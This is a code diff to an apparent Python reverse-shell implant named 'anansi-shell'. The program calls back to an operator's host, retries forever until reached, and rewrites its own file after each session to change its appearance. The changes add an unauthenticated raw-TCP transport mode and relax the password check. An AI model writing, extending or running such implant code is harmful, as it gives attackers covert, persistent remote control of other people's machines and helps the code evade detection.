@@ -166,8 +166,11 @@ def derive_key(shared, salt):
     return HKDF(hashes.SHA256(), 32, salt, b"anansi-shell v1").derive(shared)
 
 
-def connect(host, port, password, fingerprint=None):
+def connect(host, port, password, fingerprint=None, transport_type="ssh"):
     """Open session channel for later functionality."""
+    if transport_type == "tcp":
+        # demo no ssh auth, the wrapper uses socket
+        return None, socket.create_connection((host, port))
     transport = paramiko.Transport((host, port))
     transport.start_client()
     server_key = transport.get_remote_server_key()
@@ -182,11 +185,11 @@ def connect(host, port, password, fingerprint=None):
     return transport, transport.open_session()
 
 
-def connect_forever(host, port, password, fingerprint, verbose):
+def connect_forever(host, port, password, fingerprint, verbose, transport_type="ssh"):
     """Retry until the operator answers."""
     while True:
         try:
-            return connect(host, port, password, fingerprint)
+            return connect(host, port, password, fingerprint, transport_type)
         except (OSError, EOFError, paramiko.SSHException):
             if verbose:
                 print("server unreachable, retrying", flush=True)
@@ -469,6 +472,8 @@ def main():
     parser.add_argument("--port", type=int, default=2222)
     parser.add_argument("--password")
     parser.add_argument("--fingerprint", help="expected host key SHA256 fingerprint")
+    parser.add_argument("--transport", choices=("ssh", "tcp"), default="ssh",
+                        help="demo mode: no auth, wrapper on the wire")
     parser.add_argument("--verbose", action="store_true")
     parser.add_argument("--selfcheck", action="store_true")
     args = parser.parse_args()
@@ -476,10 +481,13 @@ def main():
         selfcheck()
         print("selfcheck ok", flush=True)
         return
-    if not (args.host and args.password):
-        parser.error("--host and --password are required")
+    if not args.host:
+        parser.error("--host is required")
+    if args.transport == "ssh" and not args.password:
+        parser.error("--password is required")
     transport, channel = connect_forever(args.host, args.port, args.password,
-                                         args.fingerprint, args.verbose)
+                                         args.fingerprint, args.verbose,
+                                         args.transport)
     try:
         session(channel, args.verbose)
     except (OSError, EOFError):
@@ -489,7 +497,8 @@ def main():
         # the server closes first after b"exit", so these can hit a dead transport
         # a raise here would skip the rewrite below
         quiet_close(channel)
-        quiet_close(transport)
+        if transport is not None:
+            quiet_close(transport)
         # every session end rewrites the file (dropped/killed ones too
         # --selfcheck returned above, so runs never loop
         mutate_self(__file__, args.verbose)
